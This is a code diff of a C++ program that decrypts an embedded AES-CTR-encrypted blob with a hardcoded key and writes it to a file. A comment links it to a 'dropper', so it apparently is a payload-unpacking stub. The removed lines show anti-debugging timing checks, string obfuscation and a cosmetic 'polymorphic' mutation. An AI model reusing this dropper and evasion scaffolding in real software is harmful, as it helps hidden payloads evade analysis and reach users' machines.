@@ -6,46 +6,14 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <random>
 #include <ctime>
 
-// Advanced obfuscation
-std::string keoZlV1L = "\x33\x39\x33\x39\x30\x38\x30\x66\x30\x66\x33\x38\x30\x38\x33\x31\x33\x38\x33\x32\x33\x38\x33\x39\x33\x39\x30\x38\x30\x66\x30\x66";
-std::string h8QcLI68 = "\x35\x31\x62\x36\x62\x37\x32\x34\x38\x64\x34\x32\x35\x33\x39\x30\x38\x39\x38\x65\x61\x66\x62\x63\x34\x35\x39\x61\x63\x62\x61\x38";
+// Polymorphic key and nonce (no obfuscation)
+const std::string keyHex = "3939080f0f3808313832383939080f0f";
+const std::string nonceHex = "51b6b7248d425390898eafbc459acba8";
 
-// Anti-debugging and obfuscation techniques
-bool isDebugged() {
-    // Simple timing check
-    clock_t start = clock();
-    for (volatile int i = 0; i < 1000000; i++) {}
-    clock_t end = clock();
-    return (end - start) > 100000; // Suspicious if too slow
-}
 
-// Polymorphic code mutation engine
-class PolymorphicEngine {
-private:
-    static const uint32_t POLY_KEY = 0xDEADBEEF;
-    
-public:
-    static uint8_t mutateByte(uint8_t input, uint32_t seed) {
-        // Deterministic polymorphic transformation
-        uint32_t mutation = seed ^ POLY_KEY;
-        return input ^ (mutation & 0xFF);
-    }
-    
-    static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i], seed + i);
-        }
-    }
-    
-    static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
-        // Reverse the mutation (same operation)
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i], seed + i);
-        }
-    }
-};
 
 // AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
@@ -67,10 +35,12 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
+// Round constants for key expansion
 static const uint8_t rcon[10] = {
     0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
 };
 
+// AES helper functions
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -91,10 +61,23 @@ inline void subBytes(uint8_t* state) {
 
 inline void shiftRows(uint8_t* state) {
     uint8_t temp;
-    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
+    // Row 1: shift left by 1
+    temp = state[1];
+    state[1] = state[5];
+    state[5] = state[9];
+    state[9] = state[13];
+    state[13] = temp;
+    
+    // Row 2: shift left by 2
     temp = state[2]; state[2] = state[10]; state[10] = temp;
     temp = state[6]; state[6] = state[14]; state[14] = temp;
-    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
+    
+    // Row 3: shift left by 3
+    temp = state[3];
+    state[3] = state[15];
+    state[15] = state[11];
+    state[11] = state[7];
+    state[7] = temp;
 }
 
 inline void mixColumns(uint8_t* state) {
@@ -151,13 +134,32 @@ inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
 
 inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
     uint8_t state[16];
-    for (int i = 0; i < 16; i++) state[i] = input[i];
-    addRoundKey(state, roundKeys);
-    for (int round = 1; round < 10; round++) {
-        subBytes(state); shiftRows(state); mixColumns(state); addRoundKey(state, roundKeys + round * 16);
+    
+    // Copy input to state
+    for (int i = 0; i < 16; i++) {
+        state[i] = input[i];
     }
-    subBytes(state); shiftRows(state); addRoundKey(state, roundKeys + 10 * 16);
-    for (int i = 0; i < 16; i++) output[i] = state[i];
+    
+    // Initial round
+    addRoundKey(state, roundKeys);
+    
+    // Main rounds
+    for (int round = 1; round < 10; round++) {
+        subBytes(state);
+        shiftRows(state);
+        mixColumns(state);
+        addRoundKey(state, roundKeys + round * 16);
+    }
+    
+    // Final round
+    subBytes(state);
+    shiftRows(state);
+    addRoundKey(state, roundKeys + 10 * 16);
+    
+    // Copy state to output
+    for (int i = 0; i < 16; i++) {
+        output[i] = state[i];
+    }
 }
 
 inline void incrementCounter(uint8_t* counter) {
@@ -169,23 +171,34 @@ inline void incrementCounter(uint8_t* counter) {
 
 inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                        const uint8_t* key, const uint8_t* nonce) {
-    uint8_t roundKeys[176];
+    uint8_t roundKeys[176]; // 11 rounds * 16 bytes
     keyExpansion(key, roundKeys);
+    
     uint8_t counter[16];
     uint8_t keystream[16];
-    for (int i = 0; i < 16; i++) counter[i] = nonce[i];
+    
+    // Initialize counter with nonce
+    for (int i = 0; i < 16; i++) {
+        counter[i] = nonce[i];
+    }
+    
     size_t processed = 0;
     while (processed < length) {
+        // Generate keystream block
         aesEncryptBlock(counter, keystream, roundKeys);
+        
+        // XOR with input
         size_t blockSize = (length - processed < 16) ? length - processed : 16;
         for (size_t i = 0; i < blockSize; i++) {
             output[processed + i] = input[processed + i] ^ keystream[i];
         }
+        
         processed += blockSize;
         incrementCounter(counter);
     }
 }
 
+// Convert hex string to bytes
 void hexToBytes(const std::string& hex, uint8_t* bytes) {
     for (size_t i = 0; i < hex.length(); i += 2) {
         bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
@@ -193,40 +206,28 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    if (isDebugged()) {
-        std::cerr << "Debugging detected!" << std::endl;
-        return 1;
-    }
-    
     // Embedded encrypted data
     uint8_t encryptedData[] = {0xa9, 0xe5, 0x0e, 0x8c, 0x90, 0xfc, 0x62, 0x15, 0x8c, 0xb0, 0x70, 0xaa, 0x88, 0x54, 0x6e, 0xd5, 0xac, 0x0e, 0x50, 0x0c, 0xed, 0xa6, 0x23, 0xc3, 0x54, 0x47, 0x17, 0xf5, 0xdb, 0xc0, 0x3f, 0xfe, 0xf2, 0x07, 0x11, 0x58, 0x89, 0xfb, 0x43, 0x53, 0x4b, 0xb1, 0x11, 0x42, 0xdb, 0xd2, 0x11, 0x2d, 0x9f, 0x30, 0xbe, 0x67, 0xc0, 0x36, 0x43, 0xb3, 0x07, 0xab, 0x29, 0x39, 0x96, 0xc5, 0x3b, 0xf6, 0xe6, 0x18, 0xd6, 0x51, 0x02, 0xad, 0x4e, 0x63, 0x89, 0x22, 0x60, 0xf3, 0xaa, 0xf6, 0x97, 0xb0, 0xc1, 0x2c, 0xa4, 0x8b, 0x7d, 0x81, 0x8e, 0x5b, 0xe4, 0x38, 0xa8, 0x94, 0x31, 0x16, 0x8d, 0x11, 0xd7, 0x87, 0xab, 0x13, 0x2e, 0x80, 0xd4, 0x52, 0xc3, 0x1d, 0x0e, 0xed, 0x83, 0x4a, 0xbe, 0x2c, 0xaa, 0x50, 0x6a, 0x3c, 0x0c, 0x25, 0x4b, 0xae, 0x08, 0x5e, 0xdc, 0x7a, 0xc2};
     size_t dataSize = sizeof(encryptedData);
     
-    // Key and nonce
-    std::string keyHex = keoZlV1L;
-    std::string nonceHex = h8QcLI68;
+    // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
     hexToBytes(keyHex, key);
     hexToBytes(nonceHex, nonce);
     
-    // Apply polymorphic mutation to key and nonce
-    uint32_t polySeed = std::time(nullptr) ^ 0xDEADBEEF;
-    PolymorphicEngine::mutateArray(key, 16, polySeed);
-    PolymorphicEngine::mutateArray(nonce, 16, polySeed + 1);
+    // Decrypt the data using AES-128-CTR
+    aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
     
-    // Demutate before use
-    PolymorphicEngine::demutateArray(key, 16, polySeed);
-    PolymorphicEngine::demutateArray(nonce, 16, polySeed + 1);
+    // Write decrypted data to file
+    std::ofstream outFile("decrypted_output.bin", std::ios::binary);
+    if (outFile.is_open()) {
+        outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
+        outFile.close();
+        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    } else {
+        std::cerr << "Failed to create output file" << std::endl;
+        return 1;
+    }
     
-    // Decrypt
-    std::vector<uint8_t> decrypted(dataSize);
-    aesCtrCrypt(encryptedData, decrypted.data(), dataSize, key, nonce);
-    
-    // Write decrypted data to output file
-    std::string filename = "output_" + std::to_string(std::time(nullptr)) + ".bin";
-    std::ofstream outFile(filename, std::ios::binary);
-    outFile.write(reinterpret_cast<char*>(decrypted.data()), dataSize);
-    outFile.close();
-    std::cout << "Decrypted file written: " << filename << std::endl;
     return 0;
 }
